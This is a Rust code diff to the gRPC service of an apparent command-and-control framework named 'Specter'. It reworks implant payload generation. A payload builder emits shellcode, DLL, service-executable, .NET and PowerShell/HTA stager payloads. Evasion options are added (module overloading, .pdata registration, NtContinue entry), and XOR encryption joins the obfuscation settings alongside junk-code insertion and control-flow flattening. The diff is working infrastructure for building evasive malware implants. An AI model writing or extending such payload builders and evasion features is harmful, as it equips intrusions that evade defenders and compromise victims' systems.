@@ -40,6 +40,7 @@ pub struct SpecterGrpcService {
     campaign_manager: Arc<CampaignManager>,
     azure_listener_manager: Option<Arc<AzureListenerManager>>,
     redirector_orchestrator: Option<Arc<RedirectorOrchestrator>>,
+    payload_builder: Arc<crate::builder::PayloadBuilder>,
     presence_manager: Arc<PresenceManager>,
     chat_service: Arc<ChatService>,
     report_generator: Arc<ReportGenerator>,
@@ -58,6 +59,7 @@ impl SpecterGrpcService {
         audit_log: Arc<AuditLog>,
         webhook_manager: Arc<WebhookManager>,
         campaign_manager: Arc<CampaignManager>,
+        payload_builder: Arc<crate::builder::PayloadBuilder>,
         presence_manager: Arc<PresenceManager>,
         chat_service: Arc<ChatService>,
         report_generator: Arc<ReportGenerator>,
@@ -76,6 +78,7 @@ impl SpecterGrpcService {
             campaign_manager,
             azure_listener_manager: None,
             redirector_orchestrator: None,
+            payload_builder,
             presence_manager,
             chat_service,
             report_generator,
@@ -1454,18 +1457,12 @@ impl SpecterService for SpecterGrpcService {
             None
         };
 
-        // Generate config
+        // Resolve output format
+        let output_format = crate::builder::OutputFormat::from_str(&req.format);
+
+        // Server keypair for this build
         let server_secret = x25519_dalek::StaticSecret::random_from_rng(rand::thread_rng());
         let server_pubkey = x25519_dalek::PublicKey::from(&server_secret);
-
-        let gen_config = crate::builder::generate_config(
-            &profile,
-            &server_pubkey,
-            &channels,
-            &sleep_config,
-            kill_date,
-        )
-        .map_err(|e| Status::internal(format!("Config generation failed: {e}")))?;
 
         // Obfuscation settings
         let obf_settings = if let Some(ref o) = req.obfuscation {
@@ -1475,57 +1472,75 @@ impl SpecterService for SpecterGrpcService {
                 junk_code_insertion: o.junk_code_insertion,
                 junk_density: o.junk_density.clamp(2, 64) as u8,
                 control_flow_flattening: o.control_flow_flattening,
+                xor_encryption: o.xor_encryption,
             }
         } else {
             crate::builder::ObfuscationSettings::default()
         };
 
-        // For raw format, just build blob + config
-        let payload_bytes = match req.format.as_str() {
-            "raw" | "shellcode" | "bin" => {
-                let raw = crate::builder::formats::format_raw(&[], &gen_config.config_blob);
-                // Apply obfuscation if blob is large enough
-                if raw.len() >= 16 {
-                    crate::builder::obfuscate(&raw, &obf_settings).unwrap_or(raw)
-                } else {
-                    raw
-                }
+        // Evasion flags (module overloading, .pdata, NtContinue)
+        let evasion_flags = if let Some(ref e) = req.evasion {
+            crate::builder::EvasionFlags {
+                module_overloading: e.module_overloading,
+                pdata_registration: e.pdata_registration,
+                ntcontinue_entry: e.ntcontinue_entry,
             }
-            "dll" | "sideload" => {
-                let proxy = if req.proxy_target.is_empty() {
-                    None
+        } else {
+            crate::builder::EvasionFlags::default()
+        };
+
+        // Use PayloadBuilder for PE formats (raw, dll, service_exe, dotnet)
+        // which properly loads specter.bin and embeds config via marker patching.
+        // Stagers are text-based and don't need the PIC blob.
+        let (payload_bytes, implant_pubkey) = match output_format {
+            Some(fmt) => {
+                let result = self
+                    .payload_builder
+                    .build_with_evasion(fmt, &profile, &server_pubkey, &channels, &sleep_config, kill_date, evasion_flags)
+                    .map_err(|e| Status::internal(format!("Build failed: {e}")))?;
+
+                // Apply obfuscation to the payload
+                let payload = if result.payload.len() >= 16 {
+                    crate::builder::obfuscate(&result.payload, &obf_settings)
+                        .unwrap_or(result.payload)
                 } else {
-                    Some(req.proxy_target.as_str())
+                    result.payload
                 };
-                crate::builder::formats::format_dll(&[], &gen_config.config_blob, proxy)
+
+                (payload, result.implant_pubkey.to_vec())
             }
-            "service_exe" | "service" | "exe" => {
-                let svc_name = if req.service_name.is_empty() {
-                    "SpecterSvc"
-                } else {
-                    &req.service_name
+            None => {
+                // Stager formats — generate config for the pubkey, then produce text stager
+                let gen_config = crate::builder::generate_config(
+                    &profile,
+                    &server_pubkey,
+                    &channels,
+                    &sleep_config,
+                    kill_date,
+                )
+                .map_err(|e| Status::internal(format!("Config generation failed: {e}")))?;
+
+                let stager_bytes = match req.format.as_str() {
+                    "ps1_stager" | "ps1" => crate::builder::formats::format_ps1_stager(
+                        &req.stager_url,
+                        &[],
+                        &gen_config.config_blob,
+                    )
+                    .map_err(|e| Status::invalid_argument(e.to_string()))?,
+                    "hta_stager" | "hta" => crate::builder::formats::format_hta_stager(
+                        &req.stager_url,
+                        &[],
+                        &gen_config.config_blob,
+                    )
+                    .map_err(|e| Status::invalid_argument(e.to_string()))?,
+                    other => {
+                        return Err(Status::invalid_argument(format!(
+                            "Unknown format: '{other}'"
+                        )));
+                    }
                 };
-                crate::builder::formats::format_service_exe(&[], &gen_config.config_blob, svc_name)
-            }
-            "dotnet" | ".net" | "assembly" => {
-                crate::builder::formats::format_dotnet(&[], &gen_config.config_blob)
-            }
-            "ps1_stager" | "ps1" => crate::builder::formats::format_ps1_stager(
-                &req.stager_url,
-                &[],
-                &gen_config.config_blob,
-            )
-            .map_err(|e| Status::invalid_argument(e.to_string()))?,
-            "hta_stager" | "hta" => crate::builder::formats::format_hta_stager(
-                &req.stager_url,
-                &[],
-                &gen_config.config_blob,
-            )
-            .map_err(|e| Status::invalid_argument(e.to_string()))?,
-            other => {
-                return Err(Status::invalid_argument(format!(
-                    "Unknown format: '{other}'"
-                )));
+
+                (stager_bytes, gen_config.implant_pubkey.to_vec())
             }
         };
 
@@ -1564,7 +1579,7 @@ impl SpecterService for SpecterGrpcService {
         Ok(Response::new(GeneratePayloadResponse {
             success: true,
             build_id,
-            implant_pubkey: gen_config.implant_pubkey.to_vec(),
+            implant_pubkey,
             payload: payload_bytes,
             format: req.format,
             yara_warnings,
